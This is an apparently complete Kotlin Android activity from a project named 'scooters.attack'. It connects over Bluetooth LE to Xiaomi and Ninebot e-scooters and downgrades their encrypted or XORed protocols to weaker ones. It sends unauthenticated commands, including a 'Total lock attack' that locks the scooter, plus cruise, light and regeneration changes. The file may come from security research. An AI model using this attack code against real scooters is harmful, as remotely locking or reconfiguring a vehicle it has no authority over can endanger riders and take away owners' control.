package u.scooters.attack.main

import u.scooters.attack.main.Constants.speedDelay
import u.scooters.attack.main.Constants.ampereDelay
import u.scooters.attack.main.Constants.logDelay
import androidx.core.app.ActivityCompat.OnRequestPermissionsResultCallback
import com.polidea.rxandroidble2.RxBleClient
import com.polidea.rxandroidble2.RxBleConnection
import com.polidea.rxandroidble2.RxBleDevice
import android.widget.TextView
import android.os.HandlerThread
import androidx.constraintlayout.widget.ConstraintLayout
import u.scooters.attack.util.HexString
import android.os.Bundle
import android.content.Intent
import u.scooters.attack.main.Requests.SwitchRequests.Locking.CheckLock
import u.scooters.attack.main.Requests.SwitchRequests.Cruise.CheckCruise
import u.scooters.attack.main.Requests.SwitchRequests.Light.CheckLight
import u.scooters.attack.main.Requests.SwitchRequests.Recovery.CheckRecovery
import android.annotation.SuppressLint
import android.os.Handler
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.polidea.rxandroidble2.RxBleDeviceServices
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.Observable
import io.reactivex.disposables.Disposable
import u.scooters.attack.main.Requests.*
import u.scooters.attack.main.Requests.SwitchRequests.Recovery.StrongMode
import u.scooters.attack.main.Requests.SwitchRequests.Recovery.MediumMode
import u.scooters.attack.main.Requests.SwitchRequests.Recovery.WeakMode
import u.scooters.attack.main.Requests.SwitchRequests.Light.LightOn
import u.scooters.attack.main.Requests.SwitchRequests.Light.LightOff
import u.scooters.attack.main.Requests.SwitchRequests.Cruise.CruiseOn
import u.scooters.attack.main.Requests.SwitchRequests.Cruise.CruiseOff
import u.scooters.attack.main.Requests.SwitchRequests.Locking.LockOn
import u.scooters.attack.main.Requests.SwitchRequests.Locking.LockOff
import u.scooters.attack.util.Commands
import u.scooters.attack.util.LegacyPacketBuilder
import u.scooters.attack.util.NinebotProtocolEncryption
import java.math.RoundingMode
import java.text.DecimalFormat
import java.util.*
import java.util.concurrent.ConcurrentSkipListSet
import java.util.concurrent.LinkedBlockingDeque

class DeviceActivity : AppCompatActivity(), OnRequestPermissionsResultCallback {
    private var rxBleClient: RxBleClient? = null
    private var connectionObservable: Observable<RxBleConnection>? = null
    private var connectionDisposable: Disposable? = null
    private var connection: RxBleConnection? = null

    private var mDeviceName: String? = null
    private var mDeviceAddress: String? = null
    private var mSecurityLevel: Int? = null

    private var protocol: String? = null

    private var name: String? = null

    private var bleDevice: RxBleDevice? = null

    private var voltageMeter: SpecialTextView? = null
    private var ampMeter: SpecialTextView? = null
    private var life: SpecialTextView? = null
    private var speedMeter: SpecialTextView? = null
    private var powerMeter: TextView? = null
    private var minPowerView: TextView? = null
    private var maxPowerView: TextView? = null
    private var efficiencyMeter: TextView? = null
    private var rangeMeter: TextView? = null
    private var recoveredPower: TextView? = null
    private var spentPower: TextView? = null
    private var time: TextView? = null
    private var battTemp: TextView? = null
    private var distance: TextView? = null
    private var capacity: TextView? = null
    private var averageSpeed: TextView? = null
    private var averageEfficiency: TextView? = null
    private var motorTemp: TextView? = null
    private var password: TextView? = null

    private var startHandlerButton: Button? = null
    private var lockButton: Button? = null
    private val requestQueue: Deque<IRequest?> = LinkedBlockingDeque()
    private val requestTypes: MutableMap<RequestType, IRequest> = HashMap()
    private val textViews: MutableList<SpecialTextView?> = ArrayList()
    private val checkFirst = ConcurrentSkipListSet<RequestType>()
    private lateinit var lastResponse: Array<String?>
    private var handlerThread: HandlerThread? = null
    private var handlerThread1: HandlerThread? = null
    private var handler: Handler? = null
    private var handler1: Handler? = null
    private var lastDepth = 0
    private var storagePermission = false
    private var handlerStarted = false
    private var runOnce = false
    private var mRootView: ConstraintLayout? = null


    private val updateSuperRunnable: Runnable = object : Runnable {
        override fun run() {
            requestQueue.add(SuperMasterRequest())
            handler!!.postDelayed(this, speedDelay.toLong())
        }
    }
    private val updateSuperBatteryRunnable: Runnable = object : Runnable {
        override fun run() {
            requestQueue.add(SuperBatteryRequest())
            handler!!.postDelayed(this, ampereDelay.toLong())
        }
    }
    private val getLogsRunnable: Runnable = object : Runnable {
        override fun run() {
            handler!!.postDelayed(this, logDelay.toLong())
        }
    }
    private val runnableMeta: Runnable = object : Runnable {
        override fun run() {
            Log.d(
                TAG,
                "Queue Size:" + requestQueue.size + " QueueDelay:" + Constants.QUEUE_DELAY + " BaseDelay:" + Constants.BASE_DELAY
            )
            Log.d(
                TAG,
                "Sent:" + Statistics.requestsSent + " Received:" + Statistics.responseReceived + " Ratio:" + Statistics.requestsSent
                    .toDouble() / Statistics.responseReceived
            )
            adjustTiming()
            if (isConnected && !runOnce) {
                handler!!.removeCallbacksAndMessages(null)
                handler!!.postDelayed(updateSuperRunnable, speedDelay.toLong())
                handler!!.postDelayed(updateSuperBatteryRunnable, ampereDelay.toLong())
                if (storagePermission) {
                    handler!!.postDelayed(getLogsRunnable, 2000)
                }
                handler!!.postDelayed(this, 30000)
                runOnce = true
            }
            if (Statistics.currentSpeed < 3) {
                fillCheckList()
            }
        }
    }
    private val process: Runnable = object : Runnable {
        override fun run() {
            if (!checkFirst.isEmpty()) {
                checkFirst()
            }
            setupNotificationAndSend()
            try {
                val toSend = requestQueue.remove()
                val command = toSend!!.requestString
                Log.d(TAG,"command:"+command);
                if (isConnected) {
                    connection!!.writeCharacteristic(
                        UUID.fromString(Constants.TX),
                        HexString.hexToBytes(command)
                    ).subscribe()
                    Log.d(TAG, "Req sent: " + command);
                    if (toSend.requestType != RequestType.NOCOUNT) {
                        Statistics.countRequest()
                    }
                }
            } catch (e: NoSuchElementException) {
            } finally {
                handler1!!.postDelayed(this, Constants.QUEUE_DELAY.toLong())
            }

        }
    }
    private var menu: Menu? = null
    override fun onDestroy() {
        super.onDestroy()
        handlerThread!!.quit()
        handlerThread1!!.quit()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        setTheme(R.style.MyAppTheme)
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_device)

        voltageMeter = findViewById(R.id.voltageMeter)
        voltageMeter!!.type = RequestType.VOLTAGE
        textViews.add(voltageMeter)
        ampMeter = findViewById(R.id.ampMeter)
        ampMeter!!.type = RequestType.AMPERE
        textViews.add(ampMeter)
        speedMeter = findViewById(R.id.speedMeter)
        speedMeter!!.type = RequestType.SPEED
        textViews.add(speedMeter)
        powerMeter = findViewById(R.id.powerMeter)
        minPowerView = findViewById(R.id.minPowerView)
        maxPowerView = findViewById(R.id.maxPowerView)
        efficiencyMeter = findViewById(R.id.efficiencyMeter)
        rangeMeter = findViewById(R.id.rangeMeter)
        recoveredPower = findViewById(R.id.recoveredPower)
        startHandlerButton = findViewById(R.id.start_handler_button)

        lockButton = findViewById(R.id.lock_button)
        spentPower = findViewById(R.id.spentPower)
        battTemp = findViewById(R.id.battTemp)
        distance = findViewById(R.id.distanceMeter)
        capacity = findViewById(R.id.remainingAmps)
        averageEfficiency = findViewById(R.id.AverageEfficiencyMeter)
        averageSpeed = findViewById(R.id.averageSpeedMeter)
        motorTemp = findViewById(R.id.motorTemp)
        time = findViewById(R.id.time)
        life = findViewById(R.id.life)
        life!!.type = RequestType.BATTERYLIFE
        textViews.add(life)
        val intent = intent
        mDeviceName = intent.getStringExtra(EXTRAS_DEVICE_NAME)
        mDeviceAddress = intent.getStringExtra(EXTRAS_DEVICE_ADDRESS)
        mSecurityLevel = intent.getIntExtra(SECURITY_LEVEL, -1)
        rxBleClient = RxBleClient.create(this)
        bleDevice = rxBleClient!!.getBleDevice(mDeviceAddress!!)
        connectionObservable = prepareConnectionObservable()
        requestTypes[RequestType.VOLTAGE] = VoltageRequest()
        requestTypes[RequestType.AMPERE] = AmpereRequest()
        requestTypes[RequestType.BATTERYLIFE] = BatteryLifeRequest()
        requestTypes[RequestType.SPEED] = SpeedRequest()
        requestTypes[RequestType.DISTANCE] = DistanceRequest()
        requestTypes[RequestType.SUPERMASTER] = SuperMasterRequest()
        requestTypes[RequestType.SUPERBATTERY] = SuperBatteryRequest()
        requestTypes[RequestType.LOCK] = CheckLock()
        requestTypes[RequestType.CRUISE] = CheckCruise()
        requestTypes[RequestType.LIGHT] = CheckLight()
        requestTypes[RequestType.RECOVERY] = CheckRecovery()
        requestTypes[RequestType.DOWNGRADETOCLEAR] = downgradeToClearRequest()
        requestTypes[RequestType.DOWNGRADETO5AA5] = downgradeTo5AA5Request()
        requestTypes[RequestType.SCOOTERNAME] = ScooterNameRequest()

        fillCheckFirstList()
        lastTimeStamp = System.nanoTime()
        mRootView = findViewById(R.id.root)
        handlerThread = HandlerThread("RequestThread")
        handlerThread!!.start()
        handler = Handler(handlerThread!!.looper)
        handlerThread1 = HandlerThread("LoggingThread")
        handlerThread1!!.start()
        handler1 = Handler(handlerThread1!!.looper)


        lockButton!!.setOnClickListener {
            Toast.makeText(this, "Total lock attack launched.", Toast.LENGTH_SHORT).show()
            requestQueue.addFirst(LockOn())

        }

    }

    private fun fillCheckFirstList() {
        checkFirst.clear()
        if (this.protocol == XIAOMI_XORED_55AB) {
            requestQueue.add(requestTypes[RequestType.DOWNGRADETOCLEAR])
            Commands.READ = 0x61
        }else if (this.protocol == NINEBOT_ENCRYPTED_5AA5){
            LegacyPacketBuilder.ninebot = true
        }else if (this.protocol == XIAOMI_ENCRYPTED_55AB){
            LegacyPacketBuilder.ninebot = true
            requestQueue.add(requestTypes[RequestType.SCOOTERNAME])
            requestQueue.add(requestTypes[RequestType.DOWNGRADETO5AA5])
        }

    }

    private fun fillCheckList() {

        //requestQueue.add(requestTypes[RequestType.CRUISE])
        //requestQueue.add(requestTypes[RequestType.LOCK])
        //requestQueue.add(requestTypes[RequestType.LIGHT])
        //requestQueue.add(requestTypes[RequestType.RECOVERY])
        requestQueue.add(requestTypes[RequestType.SPEED])
    }

    @SuppressLint("CheckResult")
    private fun setupNotificationAndSend() {
        connection!!.setupNotification(UUID.fromString(Constants.RX))
            .doOnNext { notificationObservable: Observable<ByteArray?>? -> }
            .flatMap { notificationObservable: Observable<ByteArray>? -> notificationObservable } // <-- Notification has been set up, now observe value changes.
            .onErrorResumeNext(Observable.empty())
            .subscribe { bytes: ByteArray -> updateUI(bytes) }
    }

    private fun updateUI(bytes_: ByteArray) {
        var bytes = bytes_
        if (bytes.size == 0) { //super request returns a third empty message
            return
        }


        Log.e(TAG, HexString.bytesToHex(bytes))

        if(this.protocol == NINEBOT_ENCRYPTED_5AA5 || this.protocol == XIAOMI_ENCRYPTED_55AB || this.protocol == XIAOMI_XORED_55AB){
            return;
        }



        //handler1.post(process);
        val hexString = arrayOfNulls<String>(bytes.size)
        for (i in bytes.indices) {
            val temp = ByteArray(1)
            temp[0] = bytes[i]
            hexString[i] = HexString.bytesToHex(temp)
        }



        var requestBit = hexString[5]
        if (this.protocol == NINEBOT_ENCRYPTED_5AA5)
            requestBit = hexString[6]
        Log.d(TAG, "requestBit: "+requestBit+" " + Arrays.toString(hexString));
        if (bytes.size > 10) { //Super handling
            if (requestBit == requestTypes[RequestType.SUPERMASTER]!!.requestBit) {
                lastResponse = hexString
                Statistics.countRespnse()
                return
            } else if (requestBit == requestTypes[RequestType.SUPERBATTERY]!!
                    .requestBit
            ) {
                Statistics.countRespnse()
                val now = System.nanoTime()
                var diff = (now - lastTimeStamp).toDouble()
                diff /= 1000000.0
                currDiff = diff
                lastTimeStamp = now
                Log.d(TAG, "super battery time in ms:$diff")
                requestTypes[RequestType.SUPERBATTERY]!!.handleResponse(hexString)
            } else {
                val combinedRespose = arrayOfNulls<String>(lastResponse.size + hexString.size)
                System.arraycopy(lastResponse, 0, combinedRespose, 0, lastResponse.size)
                System.arraycopy(hexString, 0, combinedRespose, lastResponse.size, hexString.size)
                val speed = requestTypes[RequestType.SUPERMASTER]!!
                    .handleResponse(combinedRespose)
                for (f in textViews) {
                    if (f!!.type == RequestType.SPEED) {
                        runOnUiThread { f.text = speed }
                    }
                }
            }
        } else {
            Log.d(TAG, "Other stuff received")
            //Statistics.countRespnse();
            for (e in requestTypes.values) {
                if (e.requestBit == requestBit) {
                    val temp = e.handleResponse(hexString)
                    if (e.requestType == RequestType.LOCK) {
                        val lock = menu!!.findItem(R.id.lock)
                        runOnUiThread { lock.isChecked = Statistics.isScooterLocked }
                        if (Statistics.isScooterLocked) {
                            Constants.BASE_DELAY = 10000
                        } else {
                            Constants.BASE_DELAY = 300
                        }
                        if (checkFirst.remove(RequestType.LOCK) && !handlerStarted) {
                            requestQueue.clear() //remove unnecessary requests
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }
                    } else if (e.requestType == RequestType.CRUISE) {
                        val cruise = menu!!.findItem(R.id.cruise)
                        runOnUiThread { cruise.isChecked = Statistics.isCruiseActive }
                        if (checkFirst.remove(RequestType.CRUISE) && !handlerStarted) {
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }
                    } else if (e.requestType == RequestType.LIGHT) {
                        val light = menu!!.findItem(R.id.light)
                        runOnUiThread { light.isChecked = Statistics.isLightActive }
                        if (checkFirst.remove(RequestType.LIGHT) && !handlerStarted) {
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }
                    } else if (e.requestType == RequestType.RECOVERY) {
                        if (temp == "00") {
                            Log.d(TAG,"weak setting");
                            val weak = menu!!.findItem(R.id.weak)
                            runOnUiThread { weak.isChecked = true }
                            //runOnUiThread(() -> medium.setChecked(false));
                            //runOnUiThread(() -> strong.setChecked(false));
                        } else if (temp == "01") {
                            Log.d(TAG,"medium setting");
                            //runOnUiThread(() -> weak.setChecked(false));
                            val medium = menu!!.findItem(R.id.medium)
                            runOnUiThread { medium.isChecked = true }
                            //runOnUiThread(() -> strong.setChecked(false));
                        } else if (temp == "02") {
                            Log.d(TAG,"strong setting");
                            //runOnUiThread(() -> weak.setChecked(false));
                            //runOnUiThread(() -> medium.setChecked(false));
                            val strong = menu!!.findItem(R.id.strong)
                            runOnUiThread { strong.isChecked = true }
                        }
                        if (checkFirst.remove(RequestType.RECOVERY) && !handlerStarted) {
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }
                    } else if (e.requestType == RequestType.DOWNGRADETOCLEAR) {

                        if (checkFirst.remove(RequestType.DOWNGRADETOCLEAR) && !handlerStarted) {
                            Log.d(TAG, "Request bit aa")
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }

                    } else if (e.requestType == RequestType.DOWNGRADETO5AA5) {

                        if (checkFirst.remove(RequestType.DOWNGRADETO5AA5) && !handlerStarted) {
                            Log.d(TAG, "Request bit aa")
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }

                    } else if (e.requestType == RequestType.SCOOTERNAME) {

                        if (checkFirst.remove(RequestType.SCOOTERNAME) && !handlerStarted) {
                            Log.d(TAG, "Request bit aa")
                            requestQueue.clear()
                            if (checkFirst.isEmpty() && !handlerStarted) {
                                handler1!!.removeCallbacksAndMessages(null)
                            }
                        }

                    }
                    for (f in textViews) {
                        if (f!!.type == e.requestType) {
                            runOnUiThread { f.text = temp }
                        }
                    }
                }
            }
        }

        //update on each response
        val t: Thread = object : Thread() {
            @SuppressLint("SetTextI18n")
            override fun run() {
                runOnUiThread {
                    powerMeter!!.setText(Statistics.power.toString() + "W")
                    val df = DecimalFormat("#.####")
                    df.roundingMode = RoundingMode.CEILING
                    val df1 = DecimalFormat("##.#")
                    df.roundingMode = RoundingMode.CEILING
                    minPowerView!!.text = "min Power: " + Statistics.getMinPower()
                        .toInt() + "W"
                    maxPowerView!!.text = "max Power: " + Statistics.getMaxPower()
                        .toInt() + "W"
                    minPowerView!!.setText("QueueD: " + Constants.QUEUE_DELAY + "ms");
                    maxPowerView!!.setText("Req/Res: " + Statistics.requestsSent + " " + Statistics.responseReceived);
                    efficiencyMeter!!.text =
                        Statistics.getMampHoursPerKilometer().toString() + " mAh/Km"
                    rangeMeter!!.text = Statistics.getRemainingRange().toString() + " km "
                    spentPower!!.text = "spent: " + df.format(Statistics.spent) + " Ah"
                    recoveredPower!!.text =
                        "recovered: " + df.format(Statistics.recovered) + " Ah"
                    time!!.text = Statistics.currDiff.toString() + " ms"
                    life!!.text = Statistics.batteryLife.toString() + " %"
                    ampMeter!!.text = Statistics.getCurrentAmpere().toString() + " A"
                    voltageMeter!!.text = Statistics.currentVoltage.toString() + " V"
                    battTemp!!.text = Statistics.batteryTemperature.toString() + " °C"
                    motorTemp!!.text = Statistics.motorTemperature.toString() + " °C"
                    capacity!!.text = Statistics.remainingCapacity.toString() + ""
                    distance!!.text = df1.format(Statistics.distanceTravelled) + " km"
                    averageEfficiency!!.text =
                        df1.format(Statistics.averageEfficiency.toLong()) + " mAh/km"
                    averageSpeed!!.text = df1.format(Statistics.averageSpeed) + " km/h"
                }
            }
        }
        t.start()
    }

    private fun prepareConnectionObservable(): Observable<RxBleConnection> {
        return bleDevice!!.establishConnection(false)
    }

    private val isConnected: Boolean
        get() = bleDevice!!.connectionState == RxBleConnection.RxBleConnectionState.CONNECTED

    fun connect(view: View?) {
        doConnect()
    }

    fun startHandler(view: View?) {
        if (!handlerStarted) {
            if (!isConnected) {
                doConnect()
                val handler = Handler()
                handler.postDelayed({
                    handler1!!.post(process)
                    handler.post(runnableMeta)
                }, 5000)
            } else {
                handler1!!.post(process)
                handler!!.post(runnableMeta)
            }
            startHandlerButton!!.text = "Stop Handler"
            handlerStarted = true
        } else {
            stopHandler()
            handlerStarted = false
        }
    }

    fun reset(view: View?) {
        Statistics.resetPowerStats()
    }

    fun stopHandler() {
        Log.d(TAG, "Stop Handler called")
        handler!!.removeCallbacksAndMessages(null)
        handler1!!.removeCallbacksAndMessages(null)
        requestQueue.clear()
        startHandlerButton!!.text = "Start Handler"
    }

    private fun doConnect() {
        if (isConnected) {
            triggerDisconnect()
        } else {

            connectionDisposable =
                bleDevice!!.establishConnection(false)
                    //.compose(bindUntilEvent(PAUSE))
                    .observeOn(AndroidSchedulers.mainThread())
                    .doFinally { dispose() }
                    .doOnError { throwable: Throwable? ->
                        println("ERROR,disconnect")
                        Toast.makeText(
                            this@DeviceActivity,
                            "Could not connect to scooter,please retry",
                            Toast.LENGTH_LONG
                        ).show()
                        //handler.removeCallbacksAndMessages(null);
                        //handler1.removeCallbacksAndMessages(null);
                        dispose()
                        time!!.text = "disconnected"
                    }
                    .subscribe({ connection: RxBleConnection -> onConnectionReceived(connection) }) { throwable: Throwable ->
                        onConnectionFailure(
                            throwable
                        )
                    }
        }
    }

    private fun triggerDisconnect() {
        if (connectionDisposable != null) {
            connectionDisposable!!.dispose()
        }
        time!!.text = "disconnected"
        stopHandler()
    }

    private fun dispose() {
        connectionDisposable = null


    }

    private fun onConnectionFailure(throwable: Throwable) {
        Log.d(TAG, "connection fail: " + throwable.message)
        Toast.makeText(
            this@DeviceActivity,
            "Could not connect to scooter,please retry",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun onConnectionReceived(connection: RxBleConnection) {

        this.protocol = XIAOMI_LEGACY_55AA
        if (this.mSecurityLevel == Constants.NO_SECURITY)
            this.protocol = XIAOMI_LEGACY_55AA
        else if(this.mSecurityLevel == Constants.XOR_SECURITY)
            this.protocol = XIAOMI_XORED_55AB
        else if(this.mSecurityLevel == Constants.ENCRYPT_SECURITY)
            connection.discoverServices().subscribe( {services: RxBleDeviceServices -> findSecureProtocol(services)} )

        this.name = bleDevice?.name


        Thread.sleep(1_500)
        fillCheckFirstList()
        Toast.makeText(this@DeviceActivity, "Starting preliminary activities", Toast.LENGTH_LONG).show()
        this.connection = connection
        time!!.text = "connected"
        handler1!!.post(process)
        checkFirst()

        Log.d(TAG,"Using protocol: "+ this.protocol.toString())

        LegacyPacketBuilder.encryptionNinebot = NinebotProtocolEncryption(this.name.toString())

    }



    @SuppressLint("CheckResult")
    private fun findSecureProtocol(services: RxBleDeviceServices){
        if(services.bluetoothGattServices.get(3).characteristics[2].uuid.toString().equals(Constants.AVDTP))
            this.protocol = XIAOMI_ENCRYPTED_55AB
        else
            this.protocol = NINEBOT_ENCRYPTED_5AA5
         return
    }


    private fun checkFirst() {
        /*
        checkFirst.clear()
        if (this.protocol == XIAOMI_XORED_55AB) {
            requestQueue.add(requestTypes[RequestType.DOWNGRADETOCLEAR])
            Commands.READ = 0x61
        }else if (this.protocol == NINEBOT_ENCRYPTED_5AA5){
            LegacyPacketBuilder.ninebot = true
        }else if (this.protocol == XIAOMI_ENCRYPTED_55AB){
            LegacyPacketBuilder.ninebot = true
            requestQueue.add(requestTypes[RequestType.SCOOTERNAME])
            requestQueue.add(requestTypes[RequestType.DOWNGRADETO5AA5])
        }
    */
        //requestQueue.addFirst(requestTypes[RequestType.SCOOTERNAME])
        //requestQueue.addFirst(requestTypes[RequestType.SPEED])
        //requestQueue.addFirst(requestTypes[RequestType.VOLTAGE])

    }

    //Change request and queue timings
    private fun adjustTiming() {
        val requests = Statistics.requestsSent.toDouble()
        val response = Statistics.responseReceived.toDouble()
        if (requests / response > 1.3) {
            Constants.QUEUE_DELAY = (Constants.QUEUE_DELAY * 1.1).toInt()
        } else if (requests / response == 1.0) {
            Constants.QUEUE_DELAY = (Constants.QUEUE_DELAY * 0.9).toInt()
        }
        val size = requestQueue.size
        if (requestQueue.size > 50 && lastDepth <= size) {
            Constants.BASE_DELAY = (Constants.BASE_DELAY * 1.1).toInt()
        } else if (requestQueue.size < 50 && lastDepth >= size) {
            Constants.BASE_DELAY = (Constants.BASE_DELAY * 0.9).toInt()
        }
        if (requestQueue.size > 100) {
            requestQueue.clear()
        }
        lastDepth = size
        Statistics.resetRequestStats()
    }

    //------MENU------
    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        this.menu = menu
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        val id = item.itemId
        if (id == R.id.action_settings) {
            // launch settings activity
            Log.d(TAG, "settings clicked")
            startActivity(Intent(this@DeviceActivity, SettingsActivity::class.java))
            return true
        } else if (id == R.id.resetStat) {
            Statistics.resetPowerStats()
            return true
        } else if (id == R.id.connect) {
            doConnect()
            return true
        } else if (id == R.id.lock) {
            if (Statistics.isScooterLocked) {
                lockOff()
                item.isChecked = false
            } else {
                lockOn()
                item.isChecked = true
            }
            return true
        } else if (id == R.id.cruise) {
            if (Statistics.isCruiseActive) {
                cruiseOff()
                item.isChecked = false
            } else {
                cruiseOn()
                item.isChecked = true
            }
            return true
        } else if (id == R.id.light) {
            if (Statistics.isLightActive) {
                lightOff()
                item.isChecked = false
            } else {
                lightOn()
                item.isChecked = true
            }
            return true
        } else if (id == R.id.weak) {
            if (Statistics.recoveryMode != 0) {
                setWeakMode()
            }
            return true
        } else if (id == R.id.medium) {
            if (Statistics.recoveryMode != 1) {
                setMediumMode()
            }
            return true
        } else if (id == R.id.strong) {
            if (Statistics.recoveryMode != 2) {
                setStrongMode()
            }
            return true
        }
        fillCheckFirstList()
        return super.onOptionsItemSelected(item)
    }

    private fun checkRecovery() {
        requestQueue.add(CheckRecovery())
    }

    private fun setStrongMode() {
        requestQueue.addFirst(StrongMode())
    }

    private fun setMediumMode() {
        requestQueue.addFirst(MediumMode())
    }

    private fun setWeakMode() {
        requestQueue.addFirst(WeakMode())
    }

    private fun lightOn() {
        requestQueue.addFirst(LightOn())
    }

    private fun lightOff() {
        requestQueue.addFirst(LightOff())
    }

    private fun cruiseOn() {
        requestQueue.addFirst(CruiseOn())
    }

    private fun cruiseOff() {
        requestQueue.addFirst(CruiseOff())
    }

    private fun lockOn() {
        requestQueue.addFirst(LockOn())
    }

    private fun lockOff() {
        requestQueue.addFirst(LockOff())
    }

    companion object {
        const val EXTRAS_DEVICE_NAME = "DEVICE_NAME"
        const val EXTRAS_DEVICE_ADDRESS = "DEVICE_ADDRESS"
        const val SECURITY_LEVEL = "SECURITY_LEVEL"
        private val TAG = DeviceActivity::class.java.simpleName
        private var lastTimeStamp: Long = 0
        private var currDiff = 0.0

        const val XIAOMI_LEGACY_55AA = "XIAOMI_LEGACY_55AA"
        const val NINEBOT_LEGACY_5AA5 = "NINEBOT_LEGACY_5AA5"
        const val XIAOMI_XORED_55AB = "XIAOMI_XORED_55AB"
        const val NINEBOT_ENCRYPTED_5AA5 = "NINEBOT_ENCRYPTED_5AA5"
        const val XIAOMI_ENCRYPTED_55AB = "XIAOMI_ENCRYPTED_55AB"

    }
}